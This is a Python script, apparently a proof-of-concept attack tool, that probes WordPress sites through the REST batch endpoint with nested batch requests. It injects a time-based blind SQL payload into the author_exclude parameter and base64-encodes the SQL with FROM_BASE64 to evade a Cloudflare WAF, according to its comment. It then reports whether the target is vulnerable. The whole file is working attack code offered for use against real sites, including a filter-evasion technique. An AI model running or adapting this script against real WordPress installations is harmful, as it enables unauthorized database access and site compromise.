#!/usr/bin/env python3
"""wp2shell_b64.py - base64编码绕过CF WAF的SLEEP注入
"""
import urllib.request, json, sys, time, urllib.parse, base64, statistics

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0",
      "Content-Type": "application/json"}

def send_batch(base, requests, timeout=15):
    batch_url = base + "/?rest_route=/batch/v1"
    payload = {
        "requests": [
            {"method": "POST", "path": "http://:"},
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]
    }
    req = urllib.request.Request(batch_url, data=json.dumps(payload).encode(), headers=UA, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()

def probetime(base, sql_expr, sleep_s):
    started = time.perf_counter()
    try:
        # base64编码SQL绕过WAF: FROM_BASE64('...')
        b64 = base64.b64encode(("SELECT IF((%s),SLEEP(%s),0)" % (sql_expr, sleep_s)).encode()).decode()
        cond = "FROM_BASE64('" + b64 + "')"
        send_batch(base, [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": "/wp/v2/categories?" + urllib.parse.urlencode({"author_exclude": cond})},
            {"method": "GET", "path": "/wp/v2/posts"},
        ])
    except Exception:
        pass
    return time.perf_counter() - started

if __name__ == "__main__":
    base = sys.argv[1].rstrip("/")
    sleep_s = float(sys.argv[2]) if len(sys.argv) > 2 else 2.0
    fast = [probetime(base, "1=0", sleep_s) for _ in range(6)]
    slow = [probetime(base, "1=1", sleep_s) for _ in range(4)]
    f, s = statistics.median(fast), statistics.median(slow)
    j = statistics.median(abs(x - f) for x in fast)
    print("fast=%.3f slow=%.3f jitter=%.3f diff=%.3f" % (f, s, j, s - f))
    print("[+] VULNERABLE" if (s - f) > max(0.1, j * 4) else "[-] not vulnerable")
